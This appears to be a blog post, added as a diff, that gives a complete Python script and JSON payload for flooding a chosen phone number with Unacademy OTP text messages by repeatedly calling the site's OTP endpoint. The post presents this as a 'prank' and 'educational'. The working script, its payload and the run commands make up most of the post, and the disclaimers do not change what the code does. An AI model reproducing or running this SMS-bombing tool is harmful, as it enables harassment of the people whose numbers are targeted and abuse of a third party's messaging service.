@@ -1,0 +1,143 @@
+---
+title: "Unlimited Unacademy OTP's Prank"
+date: '2023-09-24'
+tags: ['python', 'scripting', 'prank', 'unacademy', 'otp', 'tutorial']
+draft: false
+images: ['https://cdn-images-1.medium.com/max/800/0*Ti2wMJmJ90jvAx15']
+summary: 'A Python script tutorial for sending unlimited Unacademy OTPs to phone numbers, intended for educational purposes and responsible pranking.'
+---
+
+## Table of Contents
+
+1. **Introduction**
+2. **Prerequisite**
+3. **Getting Started**
+4. **Running the Script**
+5. **Important Note**
+6. **Conclusion**
+
+## Introduction
+
+In this article, we'll delve into a Python script that adds a touch of humor to your day by sending **unlimited Unacademy OTPs** to your friends' mobile numbers. However, it's crucial to stress that the primary purpose of this script is educational, and any misuse or harm is strongly discouraged.
+
+## Prerequisite
+
+Before we jump into the script, ensure that you have Python and pip installed on your system. You should also have a basic understanding of Python programming. There's no need for any third-party dependencies for this project; all you require is your setup and the provided script.
+
+## Getting Started
+
+1. Begin by creating a folder named "Script" in your preferred location.
+2. Within the "Script" folder, craft three files:
+
+   - main.py
+   - data.json
+   - requirements.txt
+
+3. In the "requirements.txt" file, insert the following line:
+
+```typescript
+requests
+```
+
+4. In the "data.json" file, paste the following code:
+
+```json
+[
+  {
+    "name": "UNACADEMY",
+    "url": "https://unacademy.com/api/v3/user/user_check/?enable-email=true",
+    "headers": {},
+    "body": {
+      "phone": "",
+      "country_code": "IN",
+      "otp_type": 1,
+      "email": "",
+      "send_otp": true,
+      "is_un_teach_user": false
+    }
+  }
+]
+```
+
+**Note**: You can update the "country_code" to match your country's ID.
+
+5. In the "main.py" file, paste the Python script provided:
+
+```python
+import requests
+import json
+import time
+
+
+def send_requests(index, data, mobile_number):
+    for obj in data:
+        name = obj["name"]
+        url = obj["url"]
+        headers = obj["headers"]
+        payload = obj["body"]
+
+        # Update payload with the mobile number
+        for key in payload.keys():
+            if key in keys_to_update:
+                payload[key] = mobile_number
+
+        response = requests.post(url, headers=headers, json=payload)
+
+        # Check the response status code
+        if response.status_code == 200:
+            message = json.loads(response.text)
+            print(f"{index+1} => {name}: {message['message']}")
+        else:
+            print(f"{name}: Request failed with status code {response.status_code}")
+
+        # Add a 1-minute delay between requests
+        time.sleep(60)
+
+
+if __name__ == "__main__":
+    # Fetch mobile number from the user
+    mobile_number = input("Please Enter Phone Number: ")
+    count = int(input("Please Enter Message count: "))
+
+    # Opening JSON file
+    with open("data.json") as f:
+        data = json.load(f)
+
+    # Keys to update in Payload
+    keys_to_update = ["phone"]
+
+    for index in range(count):
+        # Send requests
+        send_requests(index, data, mobile_number)
+```
+
+## Running the Script
+
+Now, follow these commands to execute the script:
+
+```python
+# Create a virtual environment
+python3 -m venv .venv
+
+# Activate the virtual environment (Linux/Mac)
+source .venv/bin/activate
+
+# Activate the virtual environment (Windows)
+.venv\Scripts\activate
+
+# Install dependencies
+pip3 install -r requirements.txt
+
+# Run the Python script
+python3 main.py
+```
+
+> After executing the script, you will be prompted to **enter the target phone number and number of OTP's you want to send**. Enter details, Press enter. And within 5 seconds, you will receive Unacademy OTP's.
+
+## Important Note
+
+At the time of writing this article, there are no restrictions number of OTP's but we can send one OTP each minute. You have the freedom to send as many OTPs as you desire to play pranks on your friends. However, it's important to note that the situation may change in the future, so be sure to check for any updates if you're reading this at a later date.
+
+## Conclusion
+
+This Python script serves as an educational tool and a lighthearted way to explore programming. Always exercise responsible and ethical coding practices. Enjoy your Unacademy OTP prank responsibly and respect the privacy and consent of others.
